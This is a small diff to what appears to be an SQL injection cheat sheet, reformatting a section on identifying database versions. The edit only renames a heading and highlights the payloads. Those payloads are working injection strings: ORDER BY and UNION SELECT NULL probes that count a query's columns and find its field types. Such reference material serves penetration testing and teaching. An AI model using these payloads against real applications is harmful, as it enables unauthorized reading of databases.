@@ -97,15 +97,17 @@
 <details>
 <summary>DATABASE TYPE/VERSION TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.
-<b>STEPS:</b>
+
+<b>PRE-REQS:</b>
 1. get column number
-<b>method1:</b>' ORDER BY 1--
-<b>method2:</b>' UNION SELECT NULL--
-2. get field type
-' UNION SELECT 'a',NULL,NULL,NULL--
-' UNION SELECT NULL,'a',NULL,NULL--
+<b>method1:</b><mark>' ORDER BY 1--</mark>
+<b>method2:</b><mark>' UNION SELECT NULL--</mark>
 	
-NOTE: It is needed to be iterative so you can find the right field type. For that number of columns
+2. get field type
+<mark>' UNION SELECT 'a',NULL,NULL,NULL--</mark>
+<mark>' UNION SELECT NULL,'a',NULL,NULL--</mark>
+	
+<b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns
 is needed.
 	
 <b>COMMON TESTS:</b>
